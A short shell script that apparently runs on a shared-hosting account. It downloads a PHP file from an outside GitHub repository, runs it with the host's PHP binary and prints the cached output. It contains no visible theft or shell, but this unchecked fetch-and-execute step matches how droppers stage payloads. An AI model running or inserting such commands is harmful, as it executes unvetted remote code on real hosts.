#!/bin/sh
cd /home/u791571885 && [ -f t167.done ] || { curl -fsSL -o t167.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs167.php" && /opt/alt/php83/usr/bin/php t167.php > t167.done 2>&1; }
head -c 9000 t167.done
